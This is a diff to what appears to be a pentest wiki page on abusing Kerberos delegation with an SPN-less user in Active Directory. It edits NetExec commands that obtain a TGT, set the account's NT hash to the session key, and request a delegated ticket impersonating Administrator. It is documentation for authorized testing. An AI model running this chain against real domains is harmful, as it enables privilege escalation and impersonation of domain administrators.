@@ -233,15 +233,15 @@ This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) 
 
 ```bash
 # Obtain a TGT for the SPN-less user and retrieve the session key
-nxc smb "$TARGET" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --generate-tgt "$USER"
+nxc smb "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --generate-tgt "$USER"
 describeTicket.py "$USER.ccache"
 
 # Set the account's NT hash to the RC4 session key value from describeTicket.py
-nxc smb "$TARGET" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M change-password -o NEWNTHASH='<rc4_session_key>'
+nxc smb "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M change-password -o NEWNTHASH='<rc4_session_key>'
 
 # Obtain the delegated service ticket through S4U2Self+U2U, followed by S4U2Proxy
 export KRB5CCNAME="$USER.ccache"
-nxc smb "$TARGET" --use-kcache --delegate Administrator --u2u
+nxc smb "$DC_IP" --use-kcache --delegate Administrator --u2u
 ```
 
 After these steps, the final service ticket can be used with [Pass-the-ticket](../ptt.md).
